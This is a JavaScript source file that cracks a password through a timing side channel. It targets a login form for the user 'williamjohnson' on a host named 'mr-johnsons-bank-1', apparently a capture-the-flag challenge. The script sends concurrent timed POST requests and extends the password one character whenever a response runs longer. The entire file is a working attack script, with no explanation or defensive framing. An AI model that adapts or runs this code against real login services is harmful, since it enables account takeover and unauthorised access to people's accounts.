import fetch from "node-fetch";

const username = "williamjohnson";
const url = "https://mr-johnsons-bank-1-bvel4oasra-uc.a.run.app/";
const alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

async function timeOneCall(username, guess) {
    const start = Date.now();
    const res = await fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
        },
        body: `username=${username}&password=${guess}`
    });
    const delta = Date.now() - start;
    return {delta, res}
}

async function timeNCallsAndReturnLowest(n, username, guess) {
    let lowestResult = {res: null, delta: 99999999}
    for (let i = 0; i < n; i++) {
        const result = await timeOneCall(username, guess)
        if (result.delta < lowestResult.delta) {
            lowestResult = result
        }
    }

    return lowestResult
}

/**
 *
 * @param guess - the guess
 * @returns {Promise<Response | null>} - response indicates success, null indicates failure
 */
async function checkGuess(guess) {
    const n = 2;
    console.log(`request (${n}) for: ${guess}`);
    // if your response times might be unstable, try 3 or 4
    const result = await timeNCallsAndReturnLowest(n, username, guess);
    const delta = result.delta;
    const res = result.res;
    console.log(`response ${guess} took ${delta}ms`);
    if (delta > ((guess.length * 500) + (guess.length > 3 ? 0 : 300))) {
        return res;
    }
    console.log(`response failed for ${guess}`);
    return null;
}

function guessHelper(guess) {
    return new Promise(async resolve => {
        resolve({
            result: await checkGuess(guess),
            guess,
        })
    })
}

async function crack() {
    const concurrentGuessLimit = 50;
    let currentGuesses = [];
    let currentPassword = "";

    while (true) {
        for (const char of alphabet) {
            if (currentGuesses.length >= concurrentGuessLimit) {
                const {result, guess} = await Promise.any(currentGuesses.map(g => g.guessPromise));
                currentGuesses = currentGuesses.filter(g => g.guess !== guess); // remove the guess that has resolved
                if (result !== null) {
                    if (!result.redirected) {
                        console.log(`found password: ${guess}`);
                        return;
                    }
                    if (guess.length > currentPassword.length) { // otherwise, the request is stale aka we already found the proper letter for this length
                        currentPassword = guess;
                        break; // start over the alphabet
                    }
                }
            }
            const guess = currentPassword + char
            const guessPromise = guessHelper(guess);
            currentGuesses.push({guess, guessPromise});
        }
    }
}

(async () => {
    const start = Date.now();
    await crack();
    console.log(`Took: ${Date.now() - start}ms`)
})();
